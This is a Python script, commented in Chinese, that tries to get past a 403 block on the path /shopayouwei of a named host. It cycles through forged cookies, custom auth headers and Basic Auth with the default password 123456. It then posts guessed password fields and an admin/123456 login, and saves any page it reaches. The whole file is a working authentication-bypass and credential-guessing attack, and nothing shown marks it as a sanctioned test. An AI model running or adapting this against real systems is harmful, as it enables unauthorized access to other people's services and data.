import requests
import base64

base_url = "http://dc380860.clsadp.com"

# 尝试不同的认证方式
auth_attempts = [
    # Cookie认证
    {"cookies": {"auth": "123456"}},
    {"cookies": {"password": "123456"}},
    {"cookies": {"login": "true"}},
    {"cookies": {"authenticated": "true"}},
    {"cookies": {"user": "admin"}},
    {"cookies": {"session": "123456"}},
    {"cookies": {"token": "123456"}},
    
    # Header认证
    {"headers": {"Authorization": "123456"}},
    {"headers": {"X-Password": "123456"}},
    {"headers": {"X-Auth": "123456"}},
    {"headers": {"Cookie": "auth=123456"}},
    
    # Basic Auth
    {"headers": {"Authorization": f"Basic {base64.b64encode(b'admin:123456').decode()}"}},
]

print("[*] 尝试不同的认证方式访问 /shopayouwei...")
for idx, auth in enumerate(auth_attempts):
    try:
        session = requests.Session()
        response = session.get(f"{base_url}/shopayouwei", timeout=5, **auth)
        
        if response.status_code != 403:
            print(f"[+] 方式 {idx+1}: {response.status_code} - {len(response.content)} bytes")
            print(f"    认证方式: {auth}")
            print(f"    响应内容: {response.text[:200]}")
            
            # 如果成功，保存结果
            if response.status_code == 200:
                with open(f"shopayouwei_success_{idx}.html", "w") as f:
                    f.write(response.text)
                print(f"    [!] 保存到 shopayouwei_success_{idx}.html")
        
    except Exception as e:
        pass

# 尝试用POST传递密码
print("\n[*] 尝试用POST传递密码...")
post_data_attempts = [
    {"password": "123456"},
    {"auth": "123456"},
    {"login": "123456"},
]

for data in post_data_attempts:
    try:
        session = requests.Session()
        response = session.post(f"{base_url}/shopayouwei", data=data, timeout=5)
        
        if response.status_code != 403:
            print(f"[+] POST数据 {data}: {response.status_code}")
            print(f"    响应: {response.text[:200]}")
    except:
        pass

# 尝试先访问主页获取可能的session，然后再访问shopayouwei
print("\n[*] 尝试先获取主页session再访问...")
session = requests.Session()
session.get(f"{base_url}/", timeout=5)
# 尝试直接提交表单
response = session.post(f"{base_url}/", data={"username": "admin", "password": "123456"}, timeout=5)
print(f"[+] 登录POST: {response.status_code}")
print(f"    Cookies: {session.cookies.get_dict()}")

# 用这个session访问shopayouwei
response = session.get(f"{base_url}/shopayouwei", timeout=5)
print(f"[+] 带session访问shopayouwei: {response.status_code}")
if response.status_code == 200:
    print(f"    响应: {response.text[:300]}")
    with open("shopayouwei_with_session.html", "w") as f:
        f.write(response.text)

print("\n[*] 测试完成")
